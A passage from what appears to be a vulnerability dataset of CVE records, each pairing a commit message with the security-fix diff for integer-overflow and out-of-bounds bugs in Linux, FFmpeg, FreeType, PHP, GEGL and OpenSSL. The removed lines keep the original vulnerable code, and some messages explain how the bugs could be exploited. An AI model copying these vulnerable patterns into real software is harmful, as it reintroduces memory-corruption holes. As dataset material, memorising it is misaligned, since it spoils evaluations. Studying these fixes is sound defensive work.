fit in\nthe long. \u00a0This is an ok thing to do, as sys_io_submit is documented as\nreturning the number of iocbs submitted, so callers should handle a\nreturn value of less than the 'nr' argument passed in.\n\nReported-by: Tavis Ormandy <taviso@cmpxchg8b.com>\nSigned-off-by: Jeff Moyer <jmoyer@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/aio.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/fs\/aio.c b\/fs\/aio.c\nindex 3006b5bc33d6..1320b2a05fb2 100644\n--- a\/fs\/aio.c\n+++ b\/fs\/aio.c\n@@ -1659,6 +1659,9 @@ long do_io_submit(aio_context_t ctx_id, long nr,\n \tif (unlikely(nr < 0))\n \t\treturn -EINVAL;\n \n+\tif (unlikely(nr > LONG_MAX\/sizeof(*iocbpp)))\n+\t\tnr = LONG_MAX\/sizeof(*iocbpp);\n+\n \tif (unlikely(!access_ok(VERIFY_READ, iocbpp, (nr*sizeof(*iocbpp)))))\n \t\treturn -EFAULT;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-9666","CWE_ID":"189","category":"security","commit_id":"257c270bd25e15890190a28a1456e7623bba4439","commit_message":"From 257c270bd25e15890190a28a1456e7623bba4439 Mon Sep 17 00:00:00 2001\nFrom: Werner Lemberg <wl@gnu.org>\nDate: Wed, 12 Nov 2014 21:42:13 +0100\nSubject: [sfnt] Fix Savannah bug #43591.\n\n* src\/sfnt\/ttsbit.c (tt_sbit_decoder_init): Protect against addition\nand multiplication overflow.\n---\n ChangeLog         | 7 +++++++\n src\/sfnt\/ttsbit.c | 8 +++++---\n 2 files changed, 12 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/ChangeLog b\/ChangeLog\nindex b42b929..a6465e7 100644\n--- a\/ChangeLog\n+++ b\/ChangeLog\n@@ -1,5 +1,12 @@\n 2014-11-12  Werner Lemberg  <wl@gnu.org>\n \n+\t[sfnt] Fix Savannah bug #43591.\n+\n+\t* src\/sfnt\/ttsbit.c (tt_sbit_decoder_init): Protect against addition\n+\tand multiplication overflow.\n+\n+2014-11-12  Werner Lemberg  <wl@gnu.org>\n+\n \t[sfnt] Fix Savannah bug #43590.\n \n \t* src\/sfnt\/ttload.c (check_table_dir, tt_face_load_font_dir):\ndiff --git a\/src\/sfnt\/ttsbit.c b\/src\/sfnt\/ttsbit.c\nindex da6b01b..b37bd7d 100644\n--- a\/src\/sfnt\/ttsbit.c\n+++ b\/src\/sfnt\/ttsbit.c\n@@ -394,9 +394,11 @@\n       p                          += 34;\n       decoder->bit_depth          = *p;\n \n-      if ( decoder->strike_index_array > face->sbit_table_size             ||\n-           decoder->strike_index_array + 8 * decoder->strike_index_count >\n-             face->sbit_table_size                                         )\n+      \/* decoder->strike_index_array +                               *\/\n+      \/*   8 * decoder->strike_index_count > face->sbit_table_size ? *\/\n+      if ( decoder->strike_index_array > face->sbit_table_size           ||\n+           decoder->strike_index_count >\n+             ( face->sbit_table_size - decoder->strike_index_array ) \/ 8 )\n         error = FT_THROW( Invalid_File_Format );\n     }\n \n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-7014","CWE_ID":"189","category":"security","commit_id":"86736f59d6a527d8bc807d09b93f971c0fe0bb07","commit_message":"From 86736f59d6a527d8bc807d09b93f971c0fe0bb07 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Fri, 30 Aug 2013 23:14:32 +0200\nSubject: [PATCH] avcodec\/pngdsp: fix (un)signed type in end comparission\n\nFixes out of array accesses\nFixes Ticket2919\n\nFound_by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/pngdsp.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/pngdsp.c b\/libavcodec\/pngdsp.c\nindex 0d247759cc0..5ab1c351b25 100644\n--- a\/libavcodec\/pngdsp.c\n+++ b\/libavcodec\/pngdsp.c\n@@ -31,7 +31,7 @@\n static void add_bytes_l2_c(uint8_t *dst, uint8_t *src1, uint8_t *src2, int w)\n {\n     long i;\n-    for (i = 0; i <= w - sizeof(long); i += sizeof(long)) {\n+    for (i = 0; i <= w - (int)sizeof(long); i += sizeof(long)) {\n         long a = *(long *)(src1 + i);\n         long b = *(long *)(src2 + i);\n         *(long *)(dst + i) = ((a & pb_7f) + (b & pb_7f)) ^ ((a ^ b) & pb_80);\n","owner":"FFmpeg","repo":"FFmpeg","source":"cve"},{"CVE_ID":"CVE-2012-4433","CWE_ID":"189","category":"security","commit_id":"1e92e5235ded0415d555aa86066b8e4041ee5a53","commit_message":"From 1e92e5235ded0415d555aa86066b8e4041ee5a53 Mon Sep 17 00:00:00 2001\nFrom: Nils Philippsen <nils@redhat.com>\nDate: Tue, 16 Oct 2012 16:58:27 +0200\nSubject: [PATCH] ppm-load: CVE-2012-4433: don't overflow memory allocation\n\nCarefully selected width\/height values could cause the size of a later\nallocation to overflow, resulting in a buffer much too small to store\nthe data which would then written beyond its end.\n---\n operations\/external\/ppm-load.c | 29 +++++++++++++++++++++++++----\n 1 file changed, 25 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/operations\/external\/ppm-load.c b\/operations\/external\/ppm-load.c\nindex efe6d56ca..3d6bce733 100644\n--- a\/operations\/external\/ppm-load.c\n+++ b\/operations\/external\/ppm-load.c\n@@ -84,7 +84,6 @@ ppm_load_read_header(FILE       *fp,\n     \/* Get Width and Height *\/\n     img->width  = strtol (header,&ptr,0);\n     img->height = atoi (ptr);\n-    img->numsamples = img->width * img->height * CHANNEL_COUNT;\n \n     fgets (header,MAX_CHARS_IN_ROW,fp);\n     maxval = strtol (header,&ptr,0);\n@@ -109,6 +108,16 @@ ppm_load_read_header(FILE       *fp,\n       g_warning (\"%s: Programmer stupidity error\", G_STRLOC);\n     }\n \n+    \/* Later on, img->numsamples is multiplied with img->bpc to allocate\n+     * memory. Ensure it doesn't overflow. *\/\n+    if (!img->width || !img->height ||\n+        G_MAXSIZE \/ img->width \/ img->height \/ CHANNEL_COUNT < img->bpc)\n+      {\n+        g_warning (\"Illegal width\/height: %ld\/%ld\", img->width, img->height);\n+        return FALSE;\n+      }\n+    img->numsamples = img->width * img->height * CHANNEL_COUNT;\n+\n     return TRUE;\n }\n \n@@ -229,12 +238,24 @@ process (GeglOperation       *operation,\n   if (!ppm_load_read_header (fp, &img))\n     goto out;\n \n-  rect.height = img.height;\n-  rect.width = img.width;\n-\n   \/* Allocating Array Size *\/\n+\n+  \/* Should use g_try_malloc(), but this causes crashes elsewhere because the\n+   * error signalled by returning FALSE isn't properly acted upon. Therefore\n+   * g_malloc() is used here which aborts if the requested memory size can't be\n+   * allocated causing a controlled crash. *\/\n   img.data = (guchar*) g_malloc (img.numsamples * img.bpc);\n \n+  \/* No-op without g_try_malloc(), see above. *\/\n+  if (! img.data)\n+    {\n+      g_warning (\"Couldn't allocate %\" G_GSIZE_FORMAT \" bytes, giving up.\", ((gsize)img.numsamples * img.bpc));\n+      goto out;\n+    }\n+\n+  rect.height = img.height;\n+  rect.width = img.width;\n+\n   switch (img.bpc)\n     {\n     case 1:\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-6819","CWE_ID":"189","category":"security","commit_id":"84afc6b70d24fc0bf686e43138c96cf60a9445fe","commit_message":"From 84afc6b70d24fc0bf686e43138c96cf60a9445fe Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Tue, 30 Jun 2015 01:19:30 +0200\nSubject: [PATCH] avcodec\/mjpegdec: Fix small picture upscale\n\nFixes out of array access\n\nFixes: asan_heap-oob_1dd60fd_267_cov_2954683513_5baad44ca4702949724234e35c5bb341.jpg\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/mjpegdec.c | 10 ++++++----\n 1 file changed, 6 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/mjpegdec.c b\/libavcodec\/mjpegdec.c\nindex 87c5862a49..8bf950db6a 100644\n--- a\/libavcodec\/mjpegdec.c\n+++ b\/libavcodec\/mjpegdec.c\n@@ -2195,11 +2195,13 @@ the_end:\n                     }\n                 } else if (s->upscale_h[p] == 2) {\n                     if (is16bit) {\n-                        ((uint16_t*)line)[w - 1] =\n-                        ((uint16_t*)line)[w - 2] = ((uint16_t*)line)[(w - 1) \/ 3];\n+                        ((uint16_t*)line)[w - 1] = ((uint16_t*)line)[(w - 1) \/ 3];\n+                        if (w > 1)\n+                            ((uint16_t*)line)[w - 2] = ((uint16_t*)line)[w - 1];\n                     } else {\n-                        line[w - 1] =\n-                        line[w - 2] = line[(w - 1) \/ 3];\n+                        line[w - 1] = line[(w - 1) \/ 3];\n+                        if (w > 1)\n+                            line[w - 2] = line[w - 1];\n                     }\n                     for (index = w - 3; index > 0; index--) {\n                         line[index] = (line[index \/ 3] + line[(index + 1) \/ 3] + line[(index + 2) \/ 3] + 1) \/ 3;\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-8549","CWE_ID":"189","category":"security","commit_id":"550f3e9df3410b3dd975e590042c0d83e20a8da3","commit_message":"From 550f3e9df3410b3dd975e590042c0d83e20a8da3 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Sat, 4 Oct 2014 22:15:07 +0200\nSubject: [PATCH] avcodec\/on2avc: Check number of channels\n\nFixes out of array access\nFixes: asan_heap-oob_4da4f3_7_asan_heap-oob_4da4f3_173_Xmen_avc_500.vp6\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/on2avc.c | 5 +++++\n 1 file changed, 5 insertions(+)\n\n","diff_code":"diff --git a\/libavcodec\/on2avc.c b\/libavcodec\/on2avc.c\nindex ab6048b63e..e5e7cc3879 100644\n--- a\/libavcodec\/on2avc.c\n+++ b\/libavcodec\/on2avc.c\n@@ -908,6 +908,11 @@ static av_cold int on2avc_decode_init(AVCodecContext *avctx)\n     On2AVCContext *c = avctx->priv_data;\n     int i;\n \n+    if (avctx->channels > 2U) {\n+        avpriv_request_sample(avctx, \"Decoding more than 2 channels\");\n+        return AVERROR_PATCHWELCOME;\n+    }\n+\n     c->avctx = avctx;\n     avctx->sample_fmt     = AV_SAMPLE_FMT_FLTP;\n     avctx->channel_layout = (avctx->channels == 2) ? AV_CH_LAYOUT_STEREO\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-2094","CWE_ID":"189","category":"security","commit_id":"8176cced706b5e5d15887584150764894e94e02f","commit_message":"From 8176cced706b5e5d15887584150764894e94e02f Mon Sep 17 00:00:00 2001\nFrom: Tommi Rantala <tt.rantala@gmail.com>\nDate: Sat, 13 Apr 2013 22:49:14 +0300\nSubject: perf: Treat attr.config as u64 in perf_swevent_init()\n\nTrinity discovered that we fail to check all 64 bits of\nattr.config passed by user space, resulting to out-of-bounds\naccess of the perf_swevent_enabled array in\nsw_perf_event_destroy().\n\nIntroduced in commit b0a873ebb (\"perf: Register PMU\nimplementations\").\n\nSigned-off-by: Tommi Rantala <tt.rantala@gmail.com>\nCc: Peter Zijlstra <a.p.zijlstra@chello.nl>\nCc: davej@redhat.com\nCc: Paul Mackerras <paulus@samba.org>\nCc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net>\nLink: http:\/\/lkml.kernel.org\/r\/1365882554-30259-1-git-send-email-tt.rantala@gmail.com\nSigned-off-by: Ingo Molnar <mingo@kernel.org>\n---\n kernel\/events\/core.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/kernel\/events\/core.c b\/kernel\/events\/core.c\nindex 7e0962ed7f8a..4d3124b39277 100644\n--- a\/kernel\/events\/core.c\n+++ b\/kernel\/events\/core.c\n@@ -5331,7 +5331,7 @@ static void sw_perf_event_destroy(struct perf_event *event)\n \n static int perf_swevent_init(struct perf_event *event)\n {\n-\tint event_id = event->attr.config;\n+\tu64 event_id = event->attr.config;\n \n \tif (event->attr.type != PERF_TYPE_SOFTWARE)\n \t\treturn -ENOENT;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-4070","CWE_ID":"189","category":"security","commit_id":"95433e8e339dbb6b5d5541473c1661db6ba2c451","commit_message":"From 95433e8e339dbb6b5d5541473c1661db6ba2c451 Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Sun, 27 Mar 2016 14:22:19 -0700\nSubject: [PATCH] Fix bug #71798 - Integer Overflow in php_raw_url_encode\n\n---\n ext\/standard\/url.c | 2 +-\n main\/php_version.h | 6 +++---\n 2 files changed, 4 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/ext\/standard\/url.c b\/ext\/standard\/url.c\nindex 2f56d31..27a216a 100644\n--- a\/ext\/standard\/url.c\n+++ b\/ext\/standard\/url.c\n@@ -599,7 +599,7 @@ PHPAPI int php_url_decode(char *str, int len)\n  *\/\n PHPAPI char *php_raw_url_encode(char const *s, int len, int *new_length)\n {\n-\tregister int x, y;\n+\tregister size_t x, y;\n \tunsigned char *str;\n \n \tstr = (unsigned char *) safe_emalloc(3, len, 1);\ndiff --git a\/main\/php_version.h b\/main\/php_version.h\nindex 25446e3..4ebff7f 100644\n--- a\/main\/php_version.h\n+++ b\/main\/php_version.h\n@@ -2,7 +2,7 @@\n \/* edit configure.in to change version number *\/\n #define PHP_MAJOR_VERSION 5\n #define PHP_MINOR_VERSION 5\n-#define PHP_RELEASE_VERSION 34\n+#define PHP_RELEASE_VERSION 27\n #define PHP_EXTRA_VERSION \"-dev\"\n-#define PHP_VERSION \"5.5.34-dev\"\n-#define PHP_VERSION_ID 50534\n+#define PHP_VERSION \"5.5.27-dev\"\n+#define PHP_VERSION_ID 50527\n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-1476","CWE_ID":"189","category":"security","commit_id":"b769f49463711205d57286e64cf535ed4daf59e9","commit_message":"From b769f49463711205d57286e64cf535ed4daf59e9 Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Wed, 23 Mar 2011 10:53:41 -0400\nSubject: [PATCH] sound\/oss: remove offset from load_patch callbacks\n\nWas: [PATCH] sound\/oss\/midi_synth: prevent underflow, use of\nuninitialized value, and signedness issue\n\nThe offset passed to midi_synth_load_patch() can be essentially\narbitrary.  If it's greater than the header length, this will result in\na copy_from_user(dst, src, negative_val).  While this will just return\n-EFAULT on x86, on other architectures this may cause memory corruption.\nAdditionally, the length field of the sysex_info structure may not be\ninitialized prior to its use.  Finally, a signed comparison may result\nin an unintentionally large loop.\n\nOn suggestion by Takashi Iwai, version two removes the offset argument\nfrom the load_patch callbacks entirely, which also resolves similar\nissues in opl3.  Compile tested only.\n\nv3 adjusts comments and hopefully gets copy offsets right.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>\n---\n sound\/oss\/dev_table.h  |  2 +-\n sound\/oss\/midi_synth.c | 30 +++++++++++++-----------------\n sound\/oss\/midi_synth.h |  2 +-\n sound\/oss\/opl3.c       |  8 ++------\n sound\/oss\/sequencer.c  |  2 +-\n 5 files changed, 18 insertions(+), 26 deletions(-)\n\n","diff_code":"diff --git a\/sound\/oss\/dev_table.h b\/sound\/oss\/dev_table.h\nindex b7617bee6388f..0199a317c5a9a 100644\n--- a\/sound\/oss\/dev_table.h\n+++ b\/sound\/oss\/dev_table.h\n@@ -271,7 +271,7 @@ struct synth_operations\n \tvoid (*reset) (int dev);\n \tvoid (*hw_control) (int dev, unsigned char *event);\n \tint (*load_patch) (int dev, int format, const char __user *addr,\n-\t     int offs, int count, int pmgr_flag);\n+\t     int count, int pmgr_flag);\n \tvoid (*aftertouch) (int dev, int voice, int pressure);\n \tvoid (*controller) (int dev, int voice, int ctrl_num, int value);\n \tvoid (*panning) (int dev, int voice, int value);\ndiff --git a\/sound\/oss\/midi_synth.c b\/sound\/oss\/midi_synth.c\nindex 3c09374ea5bf1..2292c230d7e6f 100644\n--- a\/sound\/oss\/midi_synth.c\n+++ b\/sound\/oss\/midi_synth.c\n@@ -476,7 +476,7 @@ EXPORT_SYMBOL(midi_synth_hw_control);\n \n int\n midi_synth_load_patch(int dev, int format, const char __user *addr,\n-\t\t      int offs, int count, int pmgr_flag)\n+\t\t      int count, int pmgr_flag)\n {\n \tint             orig_dev = synth_devs[dev]->midi_dev;\n \n@@ -491,33 +491,29 @@ midi_synth_load_patch(int dev, int format, const char __user *addr,\n \tif (!prefix_cmd(orig_dev, 0xf0))\n \t\treturn 0;\n \n+\t\/* Invalid patch format *\/\n \tif (format != SYSEX_PATCH)\n-\t{\n-\/*\t\t  printk(\"MIDI Error: Invalid patch format (key) 0x%x\\n\", format);*\/\n \t\t  return -EINVAL;\n-\t}\n+\n+\t\/* Patch header too short *\/\n \tif (count < hdr_size)\n-\t{\n-\/*\t\tprintk(\"MIDI Error: Patch header too short\\n\");*\/\n \t\treturn -EINVAL;\n-\t}\n+\n \tcount -= hdr_size;\n \n \t\/*\n-\t * Copy the header from user space but ignore the first bytes which have\n-\t * been transferred already.\n+\t * Copy the header from user space\n \t *\/\n \n-\tif(copy_from_user(&((char *) &sysex)[offs], &(addr)[offs], hdr_size - offs))\n+\tif (copy_from_user(&sysex, addr, hdr_size))\n \t\treturn -EFAULT;\n- \n- \tif (count < sysex.len)\n-\t{\n-\/*\t\tprintk(KERN_WARNING \"MIDI Warning: Sysex record too short (%d<%d)\\n\", count, (int) sysex.len);*\/\n+\n+\t\/* Sysex record too short *\/\n+\tif ((unsigned)count < (unsigned)sysex.len)\n \t\tsysex.len = count;\n-\t}\n-  \tleft = sysex.len;\n-  \tsrc_offs = 0;\n+\n+\tleft = sysex.len;\n+\tsrc_offs = 0;\n \n \tfor (i = 0; i < left && !signal_pending(current); i++)\n \t{\ndiff --git a\/sound\/oss\/midi_synth.h b\/sound\/oss\/midi_synth.h\nindex 6bc9d00bc77c4..b64ddd6c4abc0 100644\n--- a\/sound\/oss\/midi_synth.h\n+++ b\/sound\/oss\/midi_synth.h\n@@ -8,7 +8,7 @@ int midi_synth_open (int dev, int mode);\n void midi_synth_close (int dev);\n void midi_synth_hw_control (int dev, unsigned char *event);\n int midi_synth_load_patch (int dev, int format, const char __user * addr,\n-\t\t int offs, int count, int pmgr_flag);\n+\t\t int count, int pmgr_flag);\n void midi_synth_panning (int dev, int channel, int pressure);\n void midi_synth_aftertouch (int dev, int channel, int pressure);\n void midi_synth_controller (int dev, int channel, int ctrl_num, int value);\ndiff --git a\/sound\/oss\/opl3.c b\/sound\/oss\/opl3.c\nindex 938c48c43585e..cbf957424d5c3 100644\n--- a\/sound\/oss\/opl3.c\n+++ b\/sound\/oss\/opl3.c\n@@ -820,7 +820,7 @@ static void opl3_hw_control(int dev, unsigned char *event)\n }\n \n static int opl3_load_patch(int dev, int format, const char __user *addr,\n-\t\tint offs, int count, int pmgr_flag)\n+\t\tint count, int pmgr_flag)\n {\n \tstruct sbi_instrument ins;\n \n@@ -830,11 +830,7 @@ static int opl3_load_patch(int dev, int format, const char __user *addr,\n \t\treturn -EINVAL;\n \t}\n \n-\t\/*\n-\t * What the fuck is going on here?  We leave junk in the beginning\n-\t * of ins and then check the field pretty close to that beginning?\n-\t *\/\n-\tif(copy_from_user(&((char *) &ins)[offs], addr + offs, sizeof(ins) - offs))\n+\tif (copy_from_user(&ins, addr, sizeof(ins)))\n \t\treturn -EFAULT;\n \n \tif (ins.channel < 0 || ins.channel >= SBFM_MAXINSTR)\ndiff --git a\/sound\/oss\/sequencer.c b\/sound\/oss\/sequencer.c\nindex 5ea1098ac427a..30bcfe470f831 100644\n--- a\/sound\/oss\/sequencer.c\n+++ b\/sound\/oss\/sequencer.c\n@@ -241,7 +241,7 @@ int sequencer_write(int dev, struct file *file, const char __user *buf, int coun\n \t\t\t\treturn -ENXIO;\n \n \t\t\tfmt = (*(short *) &event_rec[0]) & 0xffff;\n-\t\t\terr = synth_devs[dev]->load_patch(dev, fmt, buf, p + 4, c, 0);\n+\t\t\terr = synth_devs[dev]->load_patch(dev, fmt, buf + p, c, 0);\n \t\t\tif (err < 0)\n \t\t\t\treturn err;\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-4511","CWE_ID":"189","category":"security","commit_id":"7314e613d5ff9f0934f7a0f74ed7973b903315d1","commit_message":"From 7314e613d5ff9f0934f7a0f74ed7973b903315d1 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Tue, 29 Oct 2013 10:21:34 -0700\nSubject: Fix a few incorrectly checked [io_]remap_pfn_range() calls\n\nNico Golde reports a few straggling uses of [io_]remap_pfn_range() that\nreally should use the vm_iomap_memory() helper.  This trivially converts\ntwo of them to the helper, and comments about why the third one really\nneeds to continue to use remap_pfn_range(), and adds the missing size\ncheck.\n\nReported-by: Nico Golde <nico@ngolde.de>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org.\n---\n drivers\/uio\/uio.c        | 17 +++++++++++++++--\n drivers\/video\/au1100fb.c | 26 +-------------------------\n drivers\/video\/au1200fb.c | 23 +----------------------\n 3 files changed, 17 insertions(+), 49 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/uio\/uio.c b\/drivers\/uio\/uio.c\nindex ba475632c5fa..0e808cf91d97 100644\n--- a\/drivers\/uio\/uio.c\n+++ b\/drivers\/uio\/uio.c\n@@ -642,16 +642,29 @@ static int uio_mmap_physical(struct vm_area_struct *vma)\n {\n \tstruct uio_device *idev = vma->vm_private_data;\n \tint mi = uio_find_mem_index(vma);\n+\tstruct uio_mem *mem;\n \tif (mi < 0)\n \t\treturn -EINVAL;\n+\tmem = idev->info->mem + mi;\n \n-\tvma->vm_ops = &uio_physical_vm_ops;\n+\tif (vma->vm_end - vma->vm_start > mem->size)\n+\t\treturn -EINVAL;\n \n+\tvma->vm_ops = &uio_physical_vm_ops;\n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \n+\t\/*\n+\t * We cannot use the vm_iomap_memory() helper here,\n+\t * because vma->vm_pgoff is the map index we looked\n+\t * up above in uio_find_mem_index(), rather than an\n+\t * actual page offset into the mmap.\n+\t *\n+\t * So we just do the physical mmap without a page\n+\t * offset.\n+\t *\/\n \treturn remap_pfn_range(vma,\n \t\t\t       vma->vm_start,\n-\t\t\t       idev->info->mem[mi].addr >> PAGE_SHIFT,\n+\t\t\t       mem->addr >> PAGE_SHIFT,\n \t\t\t       vma->vm_end - vma->vm_start,\n \t\t\t       vma->vm_page_prot);\n }\ndiff --git a\/drivers\/video\/au1100fb.c b\/drivers\/video\/au1100fb.c\nindex a54ccdc4d661..22ad85242e5b 100644\n--- a\/drivers\/video\/au1100fb.c\n+++ b\/drivers\/video\/au1100fb.c\n@@ -361,37 +361,13 @@ void au1100fb_fb_rotate(struct fb_info *fbi, int angle)\n int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)\n {\n \tstruct au1100fb_device *fbdev;\n-\tunsigned int len;\n-\tunsigned long start=0, off;\n \n \tfbdev = to_au1100fb_device(fbi);\n \n-\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\tstart = fbdev->fb_phys & PAGE_MASK;\n-\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);\n-\n-\toff = vma->vm_pgoff << PAGE_SHIFT;\n-\n-\tif ((vma->vm_end - vma->vm_start + off) > len) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\toff += start;\n-\tvma->vm_pgoff = off >> PAGE_SHIFT;\n-\n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \tpgprot_val(vma->vm_page_prot) |= (6 << 9); \/\/CCA=6\n \n-\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n-\t\t\t\tvma->vm_end - vma->vm_start,\n-\t\t\t\tvma->vm_page_prot)) {\n-\t\treturn -EAGAIN;\n-\t}\n-\n-\treturn 0;\n+\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);\n }\n \n static struct fb_ops au1100fb_ops =\ndiff --git a\/drivers\/video\/au1200fb.c b\/drivers\/video\/au1200fb.c\nindex 301224ecc950..1d02897d17f2 100644\n--- a\/drivers\/video\/au1200fb.c\n+++ b\/drivers\/video\/au1200fb.c\n@@ -1233,34 +1233,13 @@ static int au1200fb_fb_blank(int blank_mode, struct fb_info *fbi)\n  * method mainly to allow the use of the TLB streaming flag (CCA=6)\n  *\/\n static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)\n-\n {\n-\tunsigned int len;\n-\tunsigned long start=0, off;\n \tstruct au1200fb_device *fbdev = info->par;\n \n-\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\tstart = fbdev->fb_phys & PAGE_MASK;\n-\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);\n-\n-\toff = vma->vm_pgoff << PAGE_SHIFT;\n-\n-\tif ((vma->vm_end - vma->vm_start + off) > len) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\toff += start;\n-\tvma->vm_pgoff = off >> PAGE_SHIFT;\n-\n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \tpgprot_val(vma->vm_page_prot) |= _CACHE_MASK; \/* CCA=7 *\/\n \n-\treturn io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n-\t\t\t\t  vma->vm_end - vma->vm_start,\n-\t\t\t\t  vma->vm_page_prot);\n+\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);\n }\n \n static void set_global(u_int cmd, struct au1200_lcd_global_regs_t *pdata)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-5244","CWE_ID":"189","category":"security","commit_id":"439c5070022eab6cef7266aab47f978058012c72","commit_message":"From 439c5070022eab6cef7266aab47f978058012c72 Mon Sep 17 00:00:00 2001\nFrom: Vincent Untz <vuntz@gnome.org>\nDate: Thu, 17 Feb 2011 15:23:39 +0100\nSubject: [PATCH] backends: Fix another security issue in the dvi-backend\n\nThis is similar to one of the fixes from d4139205.\n\nhttps:\/\/bugzilla.gnome.org\/show_bug.cgi?id=640923\n---\n backend\/dvi\/mdvi-lib\/afmparse.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/backend\/dvi\/mdvi-lib\/afmparse.c b\/backend\/dvi\/mdvi-lib\/afmparse.c\nindex 361e23d6..e1cd1156 100644\n--- a\/backend\/dvi\/mdvi-lib\/afmparse.c\n+++ b\/backend\/dvi\/mdvi-lib\/afmparse.c\n@@ -190,7 +190,7 @@ static char *linetoken(FILE *stream)\n     while ((ch = fgetc(stream)) == ' ' || ch == '\\t' ); \n     \n     idx = 0;\n-    while (ch != EOF && ch != lineterm) \n+    while (ch != EOF && ch != lineterm && idx < MAX_NAME)\n     {\n         ident[idx++] = ch;\n         ch = fgetc(stream);\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-2181","CWE_ID":"189","category":"security","commit_id":"1fb9fdc3027b27d8eb6a1e6a846435b070980770","commit_message":"From 1fb9fdc3027b27d8eb6a1e6a846435b070980770 Mon Sep 17 00:00:00 2001\nFrom: Matt Caswell <matt@openssl.org>\nDate: Fri, 1 Jul 2016 15:20:33 +0100\nSubject: [PATCH] Fix DTLS replay protection\n\nThe DTLS implementation provides some protection against replay attacks\nin accordance with RFC6347 section 4.1.2.6.\n\nA sliding \"window\" of valid record sequence numbers is maintained with\nthe \"right\" hand edge of the window set to the highest sequence number we\nhave received so far. Records that arrive that are off the \"left\" hand\nedge of the window are rejected. Records within the window are checked\nagainst a list of records received so far. If we already received it then\nwe also reject the new record.\n\nIf we have not already received the record, or the sequence number is off\nthe right hand edge of the window then we verify the MAC of the record.\nIf MAC verification fails then we discard the record. Otherwise we mark\nthe record as received. If the sequence number was off the right hand edge\nof the window, then we slide the window along so that the right hand edge\nis in line with the newly received sequence number.\n\nRecords may arrive for future epochs, i.e. a record from after a CCS being\nsent, can arrive before the CCS does if the packets get re-ordered. As we\nhave not yet received the CCS we are not yet in a position to decrypt or\nvalidate the MAC of those records. OpenSSL places those records on an\nunprocessed records queue. It additionally updates the window immediately,\neven though we have not yet verified the MAC. This will only occur if\ncurrently in a handshake\/renegotiation.\n\nThis could be exploited by an attacker by sending a record for the next\nepoch (which does not have to decrypt or have a valid MAC), with a very\nlarge sequence number. This means the right hand edge of the window is\nmoved very far to the right, and all subsequent legitimate packets are\ndropped causing a denial of service.\n\nA similar effect can be achieved during the initial handshake. In this\ncase there is no MAC key negotiated yet. Therefore an attacker can send a\nmessage for the current epoch with a very large sequence number. The code\nwill process the record as normal. If the hanshake message sequence number\n(as opposed to the record sequence number that we 